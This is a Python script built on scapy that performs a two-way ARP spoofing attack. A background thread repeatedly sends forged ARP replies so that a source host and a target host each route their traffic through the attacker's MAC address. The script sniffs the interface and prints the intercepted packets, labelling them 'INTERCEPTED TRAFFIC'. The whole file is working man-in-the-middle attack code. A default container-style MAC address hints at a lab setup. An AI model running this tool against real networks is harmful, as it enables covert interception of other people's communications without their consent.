from scapy.all import sniff, Ether, IP, IPv6, ARP, sendp
from datetime import datetime
import sys, os, threading

YELLOW = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
BLUE = '\033[94m'
RESET = '\033[0m'

g_src_infected = False
g_target_infected = False

g_src_ip = None
g_src_mac = None
g_target_ip = None
g_target_mac = None
g_my_mac = os.getenv("MY_MAC")

def aggressive_poison():
    global g_src_infected, g_target_infected
    while True:
        try:
            # Poison both directions
            client_poison = Ether(dst=g_src_mac, src=g_my_mac) / ARP(
                op=2, psrc=g_target_ip, hwsrc=g_my_mac,
                pdst=g_src_ip, hwdst=g_src_mac
            )
            server_poison = Ether(dst=g_target_mac, src=g_my_mac) / ARP(
                op=2, psrc=g_src_ip, hwsrc=g_my_mac,
                pdst=g_target_ip, hwdst=g_target_mac
            )
            
            # Send multiple times for reliability
            for _ in range(2):
                if g_src_infected and g_target_infected:
                    print(f"{RED}🔥 Both sides infected, stopping poisoning.{RESET}")
                    return
                sendp(client_poison, iface=os.environ.get("IFACE", "eth0"), verbose=False)
                sendp(server_poison, iface=os.environ.get("IFACE", "eth0"), verbose=False)
            
        except Exception as e:
            print(f"Poison error: {e}")

def print_packet(packet):
    global g_src_infected, g_target_infected

    if packet.haslayer(Ether):
        src_mac = packet[Ether].src
        dst_mac = packet[Ether].dst
    else:
        src_mac = dst_mac = "N/A"

    if src_mac == g_my_mac:
        return
    if not packet.haslayer(ARP) and not packet.haslayer(IP) and not packet.haslayer(IPv6):
        return
    if packet.haslayer(ARP) and packet[ARP].op != 1:
        return

    print(f"{YELLOW}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
    
    if packet.haslayer(ARP):
        ip_src = packet[ARP].psrc
        ip_dst = packet[ARP].pdst

        if ip_src == ip_dst:
            print(f"{BLUE}GRATUITOUS ARP: {ip_src} announcing itself{RESET}")
        elif packet[ARP].op == 1:
            print(f"{GREEN}ARP REQUEST: {ip_src} asking for {ip_dst}{RESET}")

    elif packet.haslayer(IP):
        print(f"{BLUE}IPv4 PACKET{RESET}")
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        
        if ip_src == g_src_ip and ip_dst == g_target_ip:
            g_src_infected = True
            print(f"{RED}🔥 INTERCEPTED TRAFFIC: {ip_src} → {ip_dst}{RESET}")
        elif ip_src == g_target_ip and ip_dst == g_src_ip:
            g_target_infected = True
            print(f"{RED}🔥 INTERCEPTED TRAFFIC: {ip_src} → {ip_dst}{RESET}")
            
    elif packet.haslayer(IPv6):
        print(f"{BLUE}IPv6 PACKET{RESET}\n")
        return


    print(f"Source MAC: {src_mac}")
    print(f"Source IP: {ip_src}")
    print(f"Destination MAC: {dst_mac}")
    print(f"Destination IP: {ip_dst}")
    print("")
    sys.stdout.flush()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("❌ Missing command line arguments!")
        sys.exit(1)

    # Get from environment variables
    g_src_ip = sys.argv[1]
    g_src_mac = sys.argv[2]
    g_target_ip = sys.argv[3]
    g_target_mac = sys.argv[4]
    g_my_mac = os.getenv("MY_MAC", "02:42:ac:14:00:02")

    poison_thread = threading.Thread(target=aggressive_poison, daemon=True)
    poison_thread.start()

    print(f"{RED}🚨 ARP SPOOFING ATTACK INITIATED{RESET}")
    print(f"📍 SRC: {g_src_ip} ({g_src_mac})")
    print(f"📍 TARGET: {g_target_ip} ({g_target_mac})")
    print(f"📍 ATTACKER: {g_my_mac}")
    print(f"🎯 Intercepting all traffic between SRC and TARGET...\n")

    iface = os.environ.get("IFACE", "eth0")
    sniff(iface=iface, prn=print_packet, store=0)